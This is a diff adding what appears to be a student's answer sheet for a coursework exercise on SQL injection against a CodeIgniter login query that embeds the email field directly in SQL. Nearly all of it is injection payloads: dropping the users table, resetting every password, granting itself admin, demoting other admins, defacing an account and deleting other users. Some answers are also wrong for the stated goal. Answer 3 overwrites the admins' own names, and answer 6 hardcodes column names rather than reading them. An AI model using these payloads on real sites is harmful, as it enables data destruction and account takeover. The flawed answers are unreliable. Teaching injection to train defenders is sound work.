@@ -1,0 +1,38 @@
+Dius Montenegro : CI-II SQL INJECTTION. 
+
+//Applied through my workbench.
+
+Imagine that a website had a simple login and in its controller, all the post information was passed to the model such as follows:
+
+function ...($post) {
+$this->db->query("SELECT * FROM users WHERE email = '{$post['email']}'");
+...
+}
+For the purpose of this assignment, assume that there was no validation and the query was run for whatever email address the user specified on the login page.  Also imagine that you knew that you were user id = 135.
+
+What would you enter in the email address field to:
+
+1. Drop the entire users table?
+ANSWER: '; DROP TABLE users; --
+
+2. Update everyone's password to your password (allowing you to login to anyone's account using your password)
+ANSWER: '; UPDATE users SET password = 'your_password'; --
+
+3.Update your first_name to be the email and password of all users who is an admin (assume that there is a field in the users table called is_admin where it's 0 if the user is not an admin, or 1 if the user is an admin).  This way, when you log out and log back in, instead of saying Welcome [your first_name], it would say Welcome ___whatever was stored in first_name field___.
+ANSWER: '; UPDATE users SET first_name = CONCAT(email, password) WHERE is_admin = 1; --
+
+4.Update your user access so that you now have admin access.
+ANSWER: '; UPDATE users SET is_admin = 1 WHERE ID = 135; --
+
+5.Update all the user access of the admin so that they are no longer admin (this way, you are now the only one having admin access and you can threaten the site users).
+ANSWER: '; UPDATE users SET is_admin = 0 WHERE is_admin = 1 AND ID != 135; --
+
+6.Update your first_name to now contain all the field names available in the users table (to see if. there is other sensitive information you can hack).
+ANSWER: '; UPDATE users SET first_name = 'ID, first_name, last_name, email, password, created_at, updated_at, is_admin'; --
+
+7.Update the first_name of user id = 1 who is an admin to 'You have been hacked!'.  When this user logs in, instead of saying Welcome [first_name].  It would say, "Welcome You have been hacked!".
+ANSWER: '; UPDATE users SET first_name = 'You have been hacked!' WHERE ID = 1 AND is_admin = 1; --
+
+8.Delete all users except yourself
+ANSWER: '; DELETE FROM users WHERE ID != 135; --
+
